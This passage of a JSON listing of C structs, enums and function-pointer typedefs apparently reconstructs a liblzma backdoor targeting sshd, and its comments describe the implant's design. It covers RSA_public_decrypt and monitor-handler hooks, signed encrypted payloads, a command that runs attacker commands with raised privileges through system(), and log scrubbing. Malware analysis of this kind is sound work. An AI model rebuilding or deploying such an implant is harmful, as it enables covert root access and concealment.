      "code": "typedef union __attribute__((packed)) {\n x86_prefix_fields_t decoded;\n u16 flags_u16;\n u32 flags_u32; /* Packed view of {decoded.flags, decoded.flags2, decoded.prefix_padding[2]} used by scanners for combined mask tests. */\n struct __attribute__((packed)) {\n  u8 flags;\n  u8 flags2;\n  u8 prefix_padding[2];\n  u8 lock_rep_byte;\n  u8 seg_byte;\n  u8 osize_byte;\n  u8 asize_byte;\n  u8 vex_byte;\n  u8 vex_byte2;\n  u8 vex_byte3;\n  u8 rex_byte; /* Raw REX prefix byte when present. */\n  u8 modrm_byte; /* Raw ModRM byte. */\n  u8 modrm_mod; /* ModRM[7:6] (addressing mode). */\n  u8 modrm_reg; /* ModRM[5:3] (register/opcode extension). */\n  u8 modrm_rm; /* ModRM[2:0] (register/memory operand selector). */\n } modrm_bytes;\n} x86_prefix_state_t;"
    },
    {
      "kind": "struct",
      "names": [
        "dasm_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) dasm_ctx {\n u8* instruction; /* Base pointer to the decoded instruction so scanners can rescan or compute RIP-relative targets. */\n u64 instruction_size; /* Number of bytes consumed while decoding `instruction`. */\n x86_prefix_state_t prefix; /* Cached legacy-prefix/VEX/REX breakdown for this decode. */\n u8 mov_imm_reg_index; /* Lower 3 bits of the MOV r64, imm64 destination register (combine with REX.B when present). */\n u8 sib_byte; /* Raw SIB byte when the addressing mode uses one. */\n u8 sib_scale_bits; /* SIB scale component extracted from `sib_byte`. */\n u8 sib_index_bits; /* SIB index register (prior to applying REX.X). */\n u8 sib_base_bits; /* SIB base register (prior to applying REX.B). */\n u8 opcode_window[4]; /* Rolling opcode window that normalises one-, two-, and three-byte opcodes. */\n u8 rel32_bytes[4]; /* Scratch copy of the rel32 displacement bytes for branch/LEA scanners. */\n u64 mem_disp; /* Displacement immediate; when DF1 is set add `instruction + instruction_size` for RIP-relative targets. */\n u64 imm_signed; /* Immediate value sign-extended to 64 bits. */\n u64 imm_zeroextended; /* Immediate value zero-extended to 64 bits. */\n u64 imm_size; /* Size in bytes of the decoded immediate (0 when the opcode lacks one). */\n u8 opcode_offset; /* Offset from `instruction` to the current opcode byte used during decoding. */\n u8 decoder_scratch[7]; /* Zeroed padding the decoder reuses as scratch state. */\n} dasm_ctx_t;"
    },
    {
      "kind": "struct",
      "names": [
        "elf_info_t"
      ],
      "code": "typedef struct __attribute__((packed)) elf_info {\n Elf64_Ehdr *elfbase; /* Base pointer to the mapped ELF header used for pointer arithmetic. */\n u64 load_base_vaddr; /* Lowest PT_LOAD virtual address so runtime addrs can be rebased into the file image. */\n Elf64_Phdr *phdrs; /* Program header table inside the mapped object. */\n u64 phdr_count; /* Number of program headers validated by elf_parse. */\n Elf64_Dyn *dynamic_segment; /* PT_DYNAMIC table extracted from the load. */\n u64 dyn_entry_count; /* Number of meaningful dynamic entries discovered before DT_NULL. */\n char *dynstr; /* .dynstr (string table for dynamic symbols). */\n Elf64_Sym *dynsym; /* .dynsym pointer used by the GNU hash walker. */\n Elf64_Rela *plt_relocs; /* DT_JMPREL relocations (PLT/GOT). */\n u32 plt_reloc_count; /* Number of PLT reloc entries. */\n BOOL gnurelro_present; /* TRUE if a PT_GNU_RELRO segment was found. */\n u64 gnurelro_vaddr; /* Virtual address of the GNU_RELRO segment. */\n u64 gnurelro_memsize; /* Length of the GNU_RELRO mapping. */\n Elf64_Verdef *verdef; /* Pointer to version definition records (.gnu.version_d). */\n u64 verdef_count; /* Number of version definitions copied from DT_VERDEFNUM. */\n Elf64_Versym *versym; /* Pointer to .gnu.version for per-symbol version tags. */\n Elf64_Rela *rela_relocs; /* DT_RELA relocation table (non-PLT). */\n u32 rela_reloc_count; /* Number of DT_RELA entries. */\n u32 relr_reserved0; /* Padding/alignment so the RELR pair stays 16-byte aligned. */\n Elf64_Relr *relr_relocs; /* DT_RELR table when the binary uses compact RELR relocations. */\n u32 relr_reloc_count; /* Number of DT_RELR entries. */\n u32 relr_reserved1; /* Additional padding for RELR metadata. */\n u64 text_segment_start; /* Cached start of the executable PT_LOAD segment (page aligned). */\n u64 text_segment_size; /* Size of the cached executable segment. */\n u64 rodata_segment_start; /* Cached start of the read-only data segment. */\n u64 rodata_segment_size; /* Size of the cached rodata segment. */\n u64 data_segment_start; /* Start of the writable PT_LOAD segment (file-backed bytes). */\n u64 data_segment_size; /* Size of writable segment excluding alignment padding. */\n u64 data_segment_padding; /* Extra bytes between the file-backed end and the page boundary. */\n u64 feature_flags; /* Bitmask tracking optional tables (1=PLT,2=RELA,4=RELR,8=VERDEF,0x10=VERSYM,0x20=BIND_NOW). */\n u32 gnu_hash_nbuckets; /* GNU hash header: bucket count. */\n u32 gnu_hash_last_bloom; /* GNU hash header: bloom filter size minus one. */\n u32 gnu_hash_bloom_shift; /* GNU hash header: shift count used by the bloom filter. */\n u32 gnu_hash_reserved; /* Alignment padding before the bloom/bucket/chain pointers. */\n u64 *gnu_hash_bloom; /* Pointer to the bloom filter words. */\n u32 *gnu_hash_buckets; /* Pointer to the GNU hash buckets array. */\n u32 *gnu_hash_chain; /* Pointer to the GNU hash chain table (starting at symbias). */\n} elf_info_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_malloc_usable_size_t"
      ],
      "code": "typedef size_t (*pfn_malloc_usable_size_t)(void *ptr);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_getuid_t"
      ],
      "code": "typedef uid_t (*pfn_getuid_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_exit_t"
      ],
      "code": "typedef void (*pfn_exit_t)(int status);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_setresgid_t"
      ],
      "code": "typedef int (*pfn_setresgid_t)(gid_t rgid, gid_t egid, gid_t sgid);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_setresuid_t"
      ],
      "code": "typedef int (*pfn_setresuid_t)(uid_t ruid, uid_t euid, uid_t suid);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_system_t"
      ],
      "code": "typedef int (*pfn_system_t)(const char *command);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_write_t"
      ],
      "code": "typedef ssize_t (*pfn_write_t)(int fd, const void *buf, size_t count);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_pselect_t"
      ],
      "code": "typedef int (*pfn_pselect_t)(\n  int nfds, fd_set *readfds, fd_set *writefds,\n  fd_set *exceptfds, const struct timespec *timeout,\n  const sigset_t *sigmask);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_read_t"
      ],
      "code": "typedef ssize_t (*pfn_read_t)(int fd, void *buf, size_t count);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn___errno_location_t"
      ],
      "code": "typedef int *(*pfn___errno_location_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_setlogmask_t"
      ],
      "code": "typedef int (*pfn_setlogmask_t)(int mask);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_shutdown_t"
      ],
      "code": "typedef int (*pfn_shutdown_t)(int sockfd, int how);"
    },
    {
      "kind": "struct",
      "names": [
        "libc_imports_t"
      ],
      "code": "typedef struct __attribute__((packed)) libc_imports {\n u32 resolved_imports_count; /* Incremented whenever a libc stub resolves; reaching the expected total gates later stages. */\n u32 reserved_imports_padding; /* Alignment padding before the function pointer block. */\n pfn_malloc_usable_size_t malloc_usable_size; /* Fake allocator stub returned by find_dl_audit_offsets so liblzma callers can probe chunk sizes. */\n pfn_getuid_t getuid; /* Used when deciding whether payload commands should attempt privilege changes. */\n pfn_exit_t exit; /* Hard-exit path when hooks fail and sshd should terminate immediately. */\n pfn_setresgid_t setresgid; /* Applied by payload handlers before running `system()` commands. */\n pfn_setresuid_t setresuid; /* Companion to setresgid for privilege swaps. */\n pfn_system_t system; /* Executes decoded attacker commands (payload type 0x3). */\n pfn_write_t write; /* Socket write helper (e.g., feeding canned monitor replies). */\n pfn_pselect_t pselect; /* Used by the fd I/O helpers to mirror sshd's blocking behaviour. */\n pfn_read_t read; /* Read stub allocated during libc resolution so fd_read can avoid the PLT. */\n pfn___errno_location_t __errno_location; /* Provides thread-local errno access for the fd shims. */\n pfn_setlogmask_t setlogmask; /* Lets the implant silence syslog noise before patching. */\n pfn_shutdown_t shutdown; /* Allows hooks to close sockets cleanly when aborting connections. */\n void *__libc_stack_end; /* Snapshot of libc's __libc_stack_end so the fake allocator/import resolver can restore stack metadata. */\n} libc_imports_t;"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_RSA_public_decrypt_t"
      ],
      "code": "typedef int (*pfn_RSA_public_decrypt_t)(\n int flen, unsigned char *from, unsigned char *to,\n RSA *rsa, int padding);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_PKEY_set1_RSA_t"
      ],
      "code": "typedef int (*pfn_EVP_PKEY_set1_RSA_t)(EVP_PKEY *pkey, struct rsa_st *key);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_RSA_get0_key_t"
      ],
      "code": "typedef void (*pfn_RSA_get0_key_t)(\n const RSA *r,\n const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_DSA_get0_pqg_t"
      ],
      "code": "typedef void (*pfn_DSA_get0_pqg_t)(\n  const DSA *d, const BIGNUM **p,\n  const BIGNUM **q, const BIGNUM **g);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_DSA_get0_pub_key_t"
      ],
      "code": "typedef const BIGNUM *(*pfn_DSA_get0_pub_key_t)(const DSA *d);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EC_POINT_point2oct_t"
      ],
      "code": "typedef size_t (*pfn_EC_POINT_point2oct_t)(\n  const EC_GROUP *group, const EC_POINT *p,\n  point_conversion_form_t form, unsigned char *buf,\n  size_t len, BN_CTX *ctx);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EC_KEY_get0_public_key_t"
      ],
      "code": "typedef EC_POINT *(*pfn_EC_KEY_get0_public_key_t)(const EC_KEY *key);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EC_KEY_get0_group_t"
      ],
      "code": "typedef const EC_GROUP *(*pfn_EC_KEY_get0_group_t)(const EC_KEY *key);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_sha256_t"
      ],
      "code": "typedef EVP_MD *(*pfn_EVP_sha256_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_BN_num_bits_t"
      ],
      "code": "typedef int (*pfn_BN_num_bits_t)(const BIGNUM *a);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_PKEY_new_raw_public_key_t"
      ],
      "code": "typedef EVP_PKEY *(*pfn_EVP_PKEY_new_raw_public_key_t)(\n  int type, ENGINE *e,\n  const unsigned char *key, size_t keylen);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_MD_CTX_new_t"
      ],
      "code": "typedef EVP_MD_CTX *(*pfn_EVP_MD_CTX_new_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_DigestVerifyInit_t"
      ],
      "code": "typedef int (*pfn_EVP_DigestVerifyInit_t)(\n  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,\n  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_DigestVerify_t"
      ],
      "code": "typedef int (*pfn_EVP_DigestVerify_t)(\n  EVP_MD_CTX *ctx, const unsigned char *sig,\n  size_t siglen, const unsigned char *tbs, size_t tbslen);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_MD_CTX_free_t"
      ],
      "code": "typedef void (*pfn_EVP_MD_CTX_free_t)(EVP_MD_CTX *ctx);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_PKEY_free_t"
      ],
      "code": "typedef void (*pfn_EVP_PKEY_free_t)(EVP_PKEY *key);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_CIPHER_CTX_new_t"
      ],
      "code": "typedef EVP_CIPHER_CTX *(*pfn_EVP_CIPHER_CTX_new_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_DecryptInit_ex_t"
      ],
      "code": "typedef int (*pfn_EVP_DecryptInit_ex_t)(\n  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,\n  ENGINE *impl, const unsigned char *key, const unsigned char *iv);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_DecryptUpdate_t"
      ],
      "code": "typedef int (*pfn_EVP_DecryptUpdate_t)(\n  EVP_CIPHER_CTX *ctx, unsigned char *out,\n  int *outl, const unsigned char *in, int inl);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_DecryptFinal_ex_t"
      ],
      "code": "typedef int (*pfn_EVP_DecryptFinal_ex_t)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_CIPHER_CTX_free_t"
      ],
      "code": "typedef void (*pfn_EVP_CIPHER_CTX_free_t)(EVP_CIPHER_CTX *ctx);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_chacha20_t"
      ],
      "code": "typedef const EVP_CIPHER *(*pfn_EVP_chacha20_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_RSA_new_t"
      ],
      "code": "typedef RSA *(*pfn_RSA_new_t)(void);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_BN_dup_t"
      ],
      "code": "typedef BIGNUM *(*pfn_BN_dup_t)(const BIGNUM *from);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_BN_bin2bn_t"
      ],
      "code": "typedef BIGNUM *(*pfn_BN_bin2bn_t)(const unsigned char *s, int len, BIGNUM *ret);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_RSA_set0_key_t"
      ],
      "code": "typedef int (*pfn_RSA_set0_key_t)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_EVP_Digest_t"
      ],
      "code": "typedef int (*pfn_EVP_Digest_t)(\n  const void *data, size_t count, unsigned char *md,\n  unsigned int *size, const EVP_MD *type, ENGINE *impl);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_RSA_sign_t"
      ],
      "code": "typedef int (*pfn_RSA_sign_t)(\n  int type,\n  const unsigned char *m, unsigned int m_len,\n  unsigned char *sigret, unsigned int *siglen, RSA *rsa);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_BN_bn2bin_t"
      ],
      "code": "typedef int (*pfn_BN_bn2bin_t)(const BIGNUM *a, unsigned char *to);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_RSA_free_t"
      ],
      "code": "typedef void (*pfn_RSA_free_t)(RSA *rsa);"
    },
    {
      "kind": "typedef",
      "names": [
        "pfn_BN_free_t"
      ],
      "code": "typedef void (*pfn_BN_free_t)(BIGNUM *a);"
    },
    {
      "kind": "struct",
      "names": [
        "imported_funcs_t"
      ],
      "code": "typedef struct __attribute__((packed)) imported_funcs {\n pfn_RSA_public_decrypt_t RSA_public_decrypt_orig; /* Saved pointer to the genuine RSA_public_decrypt implementation. */\n pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA_orig; /* Original EVP_PKEY_set1_RSA before hooks attach. */\n pfn_RSA_get0_key_t RSA_get0_key_orig; /* Original RSA_get0_key before hooks attach. */\n pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt; /* sshd\u2019s PLT slot; populated when the loader finds the GOT entry. */\n pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt; /* sshd\u2019s PLT slot for EVP_PKEY_set1_RSA. */\n pfn_RSA_get0_key_t *RSA_get0_key_plt; /* sshd\u2019s PLT slot for RSA_get0_key (used for fallback jumps). */\n pfn_DSA_get0_pqg_t DSA_get0_pqg; /* DSA helpers used while hashing/serialising host keys. */\n pfn_DSA_get0_pub_key_t DSA_get0_pub_key;\n pfn_EC_POINT_point2oct_t EC_POINT_point2oct;\n pfn_EC_KEY_get0_public_key_t EC_KEY_get0_public_key;\n pfn_EC_KEY_get0_group_t EC_KEY_get0_group;\n pfn_EVP_sha256_t EVP_sha256; /* Hash primitive consumed by rsa/dsa key hashers. */\n pfn_RSA_get0_key_t RSA_get0_key_resolved; /* Direct pointer into libcrypto (bypassing PLT) for payload parsing. */\n pfn_BN_num_bits_t BN_num_bits;\n pfn_EVP_PKEY_new_raw_public_key_t EVP_PKEY_new_raw_public_key;\n pfn_EVP_MD_CTX_new_t EVP_MD_CTX_new;\n pfn_EVP_DigestVerifyInit_t EVP_DigestVerifyInit;\n pfn_EVP_DigestVerify_t EVP_DigestVerify;\n pfn_EVP_MD_CTX_free_t EVP_MD_CTX_free;\n pfn_EVP_PKEY_free_t EVP_PKEY_free;\n pfn_EVP_CIPHER_CTX_new_t EVP_CIPHER_CTX_new;\n pfn_EVP_DecryptInit_ex_t EVP_DecryptInit_ex;\n pfn_EVP_DecryptUpdate_t EVP_DecryptUpdate;\n pfn_EVP_DecryptFinal_ex_t EVP_DecryptFinal_ex;\n pfn_EVP_CIPHER_CTX_free_t EVP_CIPHER_CTX_free;\n pfn_EVP_chacha20_t EVP_chacha20; /* ChaCha primitive used to decrypt payload bodies. */\n pfn_RSA_new_t RSA_new;\n pfn_BN_dup_t BN_dup;\n pfn_BN_bin2bn_t BN_bin2bn;\n pfn_RSA_set0_key_t RSA_set0_key;\n pfn_EVP_Digest_t EVP_Digest;\n pfn_RSA_sign_t RSA_sign;\n pfn_BN_bn2bin_t BN_bn2bin;\n pfn_RSA_free_t RSA_free;\n pfn_BN_free_t BN_free;\n libc_imports_t *libc; /* Back-pointer so RSA/MM hooks can reach libc shims. */\n u32 resolved_imports_count; /* Number of successfully resolved libcrypto symbols (init expects 0x1d). */\n u32 reserved_imports_padding; /* Alignment padding after the count. */\n} imported_funcs_t;"
    },
    {
      "kind": "struct",
      "names": [
        "ssh"
      ],
      "code": "struct ssh;"
    },
    {
      "kind": "struct",
      "names": [
        "sshbuf"
      ],
      "code": "struct sshbuf;"
    },
    {
      "kind": "typedef",
      "names": [
        "ssh"
      ],
      "code": "typedef struct ssh ssh;"
    },
    {
      "kind": "typedef",
      "names": [
        "sshbuf"
      ],
      "code": "typedef struct sshbuf sshbuf;"
    },
    {
      "kind": "typedef",
      "names": [
        "sshd_monitor_func_t"
      ],
      "code": "typedef int (*sshd_monitor_func_t)(struct ssh *ssh, int sock, struct sshbuf *m);"
    },
    {
      "kind": "enum",
      "names": [
        "monitor_reqtype"
      ],
      "code": "typedef enum monitor_reqtype {\n /* Mirror of OpenSSH monitor IPC opcodes (even = request, odd = answer). */\n MONITOR_REQ_MODULI = 0,\n MONITOR_ANS_MODULI = 1,\n MONITOR_REQ_FREE = 2,\n MONITOR_REQ_AUTHSERV = 4,\n MONITOR_REQ_SIGN = 6,\n MONITOR_ANS_SIGN = 7,\n MONITOR_REQ_PWNAM = 8,\n MONITOR_ANS_PWNAM = 9,\n MONITOR_REQ_AUTH2_READ_BANNER = 10,\n MONITOR_ANS_AUTH2_READ_BANNER = 11,\n MONITOR_REQ_AUTHPASSWORD = 12,\n MONITOR_ANS_AUTHPASSWORD = 13,\n MONITOR_REQ_BSDAUTHQUERY = 14,\n MONITOR_ANS_BSDAUTHQUERY = 15,\n MONITOR_REQ_BSDAUTHRESPOND = 16,\n MONITOR_ANS_BSDAUTHRESPOND = 17,\n MONITOR_REQ_KEYALLOWED = 22,\n MONITOR_ANS_KEYALLOWED = 23,\n MONITOR_REQ_KEYVERIFY = 24,\n MONITOR_ANS_KEYVERIFY = 25,\n MONITOR_REQ_KEYEXPORT = 26,\n MONITOR_REQ_PTY = 28,\n MONITOR_ANS_PTY = 29,\n MONITOR_REQ_PTYCLEANUP = 30,\n MONITOR_REQ_SESSKEY = 32,\n MONITOR_ANS_SESSKEY = 33,\n MONITOR_REQ_SESSID = 34,\n MONITOR_REQ_RSAKEYALLOWED = 36,\n MONITOR_ANS_RSAKEYALLOWED = 37,\n MONITOR_REQ_RSACHALLENGE = 38,\n MONITOR_ANS_RSACHALLENGE = 39,\n MONITOR_REQ_RSARESPONSE = 40,\n MONITOR_ANS_RSARESPONSE = 41,\n MONITOR_REQ_GSSSETUP = 42,\n MONITOR_ANS_GSSSETUP = 43,\n MONITOR_REQ_GSSSTEP = 44,\n MONITOR_ANS_GSSSTEP = 45,\n MONITOR_REQ_GSSUSEROK = 46,\n MONITOR_ANS_GSSUSEROK = 47,\n MONITOR_REQ_GSSCHECKMIC = 48,\n MONITOR_ANS_GSSCHECKMIC = 49,\n MONITOR_REQ_TERM = 50,\n MONITOR_REQ_PAM_START = 100,\n MONITOR_REQ_PAM_ACCOUNT = 102,\n MONITOR_ANS_PAM_ACCOUNT = 103,\n MONITOR_REQ_PAM_INIT_CTX = 104,\n MONITOR_ANS_PAM_INIT_CTX = 105,\n MONITOR_REQ_PAM_QUERY = 106,\n MONITOR_ANS_PAM_QUERY = 107,\n MONITOR_REQ_PAM_RESPOND = 108,\n MONITOR_ANS_PAM_RESPOND = 109,\n MONITOR_REQ_PAM_FREE_CTX = 110,\n MONITOR_ANS_PAM_FREE_CTX = 111,\n MONITOR_REQ_AUDIT_EVENT = 112,\n MONITOR_REQ_AUDIT_COMMAND = 113,\n} monitor_reqtype;"
    },
    {
      "kind": "typedef",
      "names": [
        "monitor_reqtype_t"
      ],
      "code": "typedef enum monitor_reqtype monitor_reqtype_t;"
    },
    {
      "kind": "enum",
      "names": [
        "payload_command_type"
      ],
      "code": "typedef enum payload_command_type {\n PAYLOAD_COMMAND_STASH_AUTHPASSWORD = 0x1, /* Queue an mm_answer_authpassword payload for later use. */\n PAYLOAD_COMMAND_KEYVERIFY_REPLY = 0x2, /* Carry a canned mm_answer_keyverify payload that the hook writes back. */\n PAYLOAD_COMMAND_SYSTEM_EXEC = 0x3 /* Request privilege escalation and exec() via libc. */\n} payload_command_type;"
    },
    {
      "kind": "typedef",
      "names": [
        "payload_command_type_t"
      ],
      "code": "typedef u8 payload_command_type_t;"
    },
    {
      "kind": "struct",
      "names": [
        "sshd_payload_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) sshd_payload_ctx {\n u16 payload_total_size; /* Total decrypted payload length (header + trailer + body). */\n u8 signed_header_prefix[0x39]; /* First 0x39 bytes of header metadata that the Ed448 signature covers. */\n payload_command_type_t command_type; /* PAYLOAD_COMMAND_STASH_AUTHPASSWORD => stash authpayload, PAYLOAD_COMMAND_KEYVERIFY_REPLY => canned reply, PAYLOAD_COMMAND_SYSTEM_EXEC => system/elevate command. */\n u8 ed448_signature[0x72];\n u16 body_payload_offset; /* Offset into `payload_body` where the attacker-supplied command stream begins. */\n u8 payload_body[]; /* Decrypted body (begins at offset 0xae of the blob, includes padding + command bytes). */\n} sshd_payload_ctx_t;"
    },
    {
      "kind": "struct",
      "names": [
        "sshd_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) sshd_ctx {\n BOOL have_mm_answer_keyallowed; /* mm_answer_keyallowed located and hook slot writable. */\n BOOL have_mm_answer_authpassword; /* mm_answer_authpassword located and hook slot writable. */\n BOOL have_mm_answer_keyverify; /* mm_answer_keyverify located and hook slot writable. */\n u8 hook_flags_padding[4];\n sshd_monitor_func_t mm_answer_authpassword_hook; /* Hook entry installed for MONITOR_REQ_AUTHPASSWORD. */\n sshd_monitor_func_t mm_answer_keyallowed_hook; /* Hook entry that runs the payload state machine. */\n sshd_monitor_func_t mm_answer_keyverify_hook; /* Hook entry that replies to keyverify without sshd. */\n sshd_monitor_func_t *mm_answer_authpassword_start; /* Original mm_answer_authpassword() start in sshd. */\n void *mm_answer_authpassword_end; /* Original mm_answer_authpassword() end address (scan bound). */\n sshd_monitor_func_t *mm_answer_authpassword_slot; /* Pointer to monitor_dispatch[authpassword] slot. */\n monitor_reqtype_t monitor_reqtype_authpassword; /* MONITOR_REQ_* code used for authpassword replies. */\n u8 authpassword_padding[4];\n sshd_monitor_func_t *mm_answer_keyallowed_start; /* Original mm_answer_keyallowed() start in sshd. */\n void *mm_answer_keyallowed_end; /* Original mm_answer_keyallowed() end address (scan bound). */\n sshd_monitor_func_t *mm_answer_keyallowed_slot; /* Pointer to monitor_dispatch[keyallowed] slot. */\n monitor_reqtype_t mm_answer_keyallowed_reqtype; /* MONITOR_REQ_* code used for keyallowed requests. */\n u8 keyallowed_padding[4];\n sshd_monitor_func_t *mm_answer_keyverify_start; /* Original mm_answer_keyverify() start in sshd. */\n void *mm_answer_keyverify_end; /* Original mm_answer_keyverify() end address (scan bound). */\n sshd_monitor_func_t *mm_answer_keyverify_slot; /* Pointer to monitor_dispatch[keyverify] slot. */\n u8 keyverify_padding[4];\n u16 keyverify_reply_len; /* Length of canned mm_answer_keyverify reply staged by payload. */\n u8 keyverify_reply_padding[2];\n u8 *keyverify_reply_buf; /* Buffer for canned mm_answer_keyverify reply. */\n u16 pending_authpayload_len; /* Length of pending mm_answer_authpassword payload body. */\n u8 pending_authpayload_padding[6];\n sshd_payload_ctx_t *pending_authpayload; /* Queued authpassword body consumed by the authpassword hook. */\n char *auth_log_fmt_reloc; /* Relocation for EncodedStringId 0x198 used to fingerprint the auth handlers. */\n void *mm_request_send_start; /* monitor mm_request_send() start in sshd. */\n void *mm_request_send_end; /* monitor mm_request_send() end in sshd. */\n u32 auth_root_allowed_flag; /* Set when PermitRootLogin uses a standalone global flag (vs. a struct field). */\n u32 sshd_ctx_reserved;\n int *use_pam_ptr; /* Pointer to sshd's `use_pam` global. */\n int *permit_root_login_ptr; /* Pointer to sshd's `permit_root_login` global. */\n char *STR_without_password; /* \"without-password\" string in sshd rodata. */\n char *STR_publickey; /* \"publickey\" string in sshd rodata. */\n} sshd_ctx_t;"
    },
    {
      "kind": "enum",
      "names": [
        "LogLevel"
      ],
      "code": "typedef enum {\n SYSLOG_LEVEL_QUIET,\n SYSLOG_LEVEL_FATAL,\n SYSLOG_LEVEL_ERROR,\n SYSLOG_LEVEL_INFO,\n SYSLOG_LEVEL_VERBOSE,\n SYSLOG_LEVEL_DEBUG1,\n SYSLOG_LEVEL_DEBUG2,\n SYSLOG_LEVEL_DEBUG3,\n SYSLOG_LEVEL_NOT_SET = -1\n} LogLevel;"
    },
    {
      "kind": "typedef",
      "names": [
        "log_handler_fn"
      ],
      "code": "typedef void (*log_handler_fn)(\n LogLevel level,\n int forced,\n const char *msg,\n void *ctx);"
    },
    {
      "kind": "typedef",
      "names": [
        "mm_log_handler_fn"
      ],
      "code": "typedef void (*mm_log_handler_fn)(LogLevel level, int forced, const char *msg, void *ctx);"
    },
    {
      "kind": "struct",
      "names": [
        "sshd_log_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) sshd_log_ctx {\n BOOL log_squelched; /* When TRUE the hook bails immediately (used to silence logging after setup or once a rewrite ran). */\n BOOL handler_slots_valid; /* Loader verified the handler/context qword locations are safe to patch. */\n BOOL syslog_mask_applied; /* Payload requested syslog suppression; hook temporarily toggles setlogmask around rewrites. */\n u8 reserved_alignment[4]; /* Padding/alignment between booleans and pointers. */\n char *fmt_percent_s; /* \"%s\" literal pulled from sshd rodata for rebuilding sanitized lines. */\n char *str_connection_closed_by; /* \"Connection closed by\" fragment used when scrubbing preauth disconnects. */\n char *str_preauth; /* \"(preauth)\" suffix for the rewritten disconnect message. */\n char *str_authenticating; /* \"Authenticating\" label preceding the reconstructed username/host. */\n char *str_user; /* \"user\" label inserted before the redacted username. */\n log_handler_fn *log_handler_slot; /* Address of sshd's global log_handler function pointer. */\n void **log_handler_ctx_slot; /* Address of the companion log_handler_ctx pointer. */\n log_handler_fn saved_log_handler; /* Original handler captured before installing mm_log_handler_hook. */\n void *saved_log_handler_ctx; /* Original log handler context value (may be NULL). */\n void *sshlogv_impl; /* Direct pointer to sshlogv for emitting sanitized messages without libc wrappers. */\n mm_log_handler_fn log_hook_entry; /* Hook trampoline we patch into sshd's handler slot. */\n} sshd_log_ctx_t;"
    },
    {
      "kind": "union",
      "names": [
        "sshd_offsets_kex_t"
      ],
      "code": "typedef union __attribute__((packed)) sshd_offsets_kex {\n struct __attribute__((packed)) {\n  sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */\n  sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */\n } bytes;\n u16 raw_value;\n} sshd_offsets_kex_t;"
    },
    {
      "kind": "union",
      "names": [
        "sshd_offsets_sshbuf_t"
      ],
      "code": "typedef union __attribute__((packed)) sshd_offsets_sshbuf {\n struct __attribute__((packed)) {\n  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */\n  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */\n } bytes;\n u16 raw_value;\n} sshd_offsets_sshbuf_t;"
    },
    {
      "kind": "struct",
      "names": [
        "sshd_offsets_fields_t"
      ],
      "code": "typedef struct __attribute__((packed)) sshd_offsets_fields {\n sshd_offsets_kex_t kex;\n sshd_offsets_sshbuf_t sshbuf;\n} sshd_offsets_fields_t;"
    },
    {
      "kind": "union",
      "names": [
        "sshd_offsets_t"
      ],
